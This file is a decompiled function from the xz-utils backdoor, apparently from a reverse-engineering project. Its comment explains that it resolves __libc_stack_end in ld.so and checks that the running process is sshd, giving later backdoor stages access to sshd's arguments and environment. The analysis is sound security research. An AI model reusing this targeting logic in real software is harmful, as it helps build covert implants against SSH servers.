// /home/kali/xzre-ghidra/xzregh/103CE0_main_elf_parse.c
// Function: main_elf_parse @ 0x103CE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall main_elf_parse(main_elf_t * main_elf)


/*
 * AutoDoc: Given a `main_elf_t` that already points at ld.so's ELF header, this routine parses the interpreter, looks up
 * `__libc_stack_end`, and then calls `process_is_sshd` to verify that the captured runtime really belongs to sshd. If the checks
 * pass it stores the resolved `__libc_stack_end` pointer back through `main_elf->__libc_stack_end`, giving later stages an easy
 * way to reach sshd's argument/environment block.
 */

#include "xzre_types.h"

BOOL main_elf_parse(main_elf_t *main_elf)

{
  elf_info_t *elf;
  BOOL parse_ok;
  Elf64_Sym *libc_stack_end_sym;
  void **libc_stack_end_ptr;
  
  parse_ok = elf_parse(main_elf->dynamic_linker_ehdr,main_elf->elf_handles->dynamic_linker);
  if ((parse_ok != FALSE) &&
     (libc_stack_end_sym = elf_symbol_get(main_elf->elf_handles->dynamic_linker,STR_libc_stack_end,
                              STR_GLIBC_2_2_5), libc_stack_end_sym != (Elf64_Sym *)0x0)) {
    elf = main_elf->elf_handles->dynamic_linker;
    libc_stack_end_ptr = elf->elfbase->e_ident + libc_stack_end_sym->st_value;
    parse_ok = process_is_sshd(elf,*(u8 **)libc_stack_end_ptr);
    if (parse_ok != FALSE) {
      *main_elf->__libc_stack_end = *(void **)libc_stack_end_ptr;
      return TRUE;
    }
  }
  return FALSE;
}

